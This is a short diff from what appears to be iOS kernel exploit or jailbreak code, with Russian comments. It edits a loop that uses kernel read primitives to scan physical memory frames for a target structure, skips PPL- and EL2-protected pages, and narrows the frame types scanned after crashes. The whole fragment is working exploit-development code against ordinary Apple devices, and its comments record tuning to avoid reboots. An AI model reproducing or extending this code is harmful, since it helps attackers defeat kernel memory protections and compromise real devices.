@@ -6272,16 +6272,15 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             kreadbuf(ftVA2 + fb * 16, ftCh2, (size_t)(nent * 16));
             for (uint64_t e = 0; e < nent && nDep < 24; e++) {
                 uint8_t t2 = ftCh2[e * 16 + 2];
-                // 1.9.217: ВСЕ безопасные типы — выигрышный форма2-хит (1.9.207) в
-                // проигрышных бутах лежал в типе вне {0x21,0x6,0xc} (лотерея типов
-                // фреймов). Табличные 0x8/0x9/0x13 census-безопасны; убийца
-                // (PPL-страница у края) ловится предсмертным логом фрейма.
-                if (!(t2 == 0x21 || t2 == 0x6 || t2 == 0xc || t2 == 0x8 || t2 == 0x9 || t2 == 0x13 || t2 == 0x11)) continue;   // 1.9.218: + 0x11 (census видел; форма2-хранилище не найдено в остальных)
+                // 1.9.220: скан ТОЛЬКО по {0x21,0x6,0xc} — выигрышный форма2-хит
+                // (1.9.207) был найден именно в этих типах; табличные {8,9,13,11}
+                // дают ТОЛЬКО риск (убийца PPL-страницы, ребуты 1.9.218 ×2 в
+                // середине скана) и ноль новых хранилищ. Лотерея типов закрыта.
+                if (!(t2 == 0x21 || t2 == 0x6 || t2 == 0xc)) continue;
                 uint64_t pa = kconstant(physBase) + (fb + e) * 0x4000;
                 uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
                 if (!kva || kpVAIsEL2Domain(kva)) continue;
                 kpNote(r, [NSString stringWithFormat:@"  [DEP] читаю фрейм %#llx t=%#x", (unsigned long long)pa, t2]);
-                if (t2 == 0x8 || t2 == 0x9 || t2 == 0x13 || t2 == 0x11) usleep(2000);   // предсмертная пауза только для табличных (убийца был среди них)
                 uint8_t pbuf2[0x4000];
                 kreadbuf(kva, pbuf2, sizeof(pbuf2));
                 for (uint32_t o = 0; o + 8 <= sizeof(pbuf2) && nDep < 24; o += 8) {
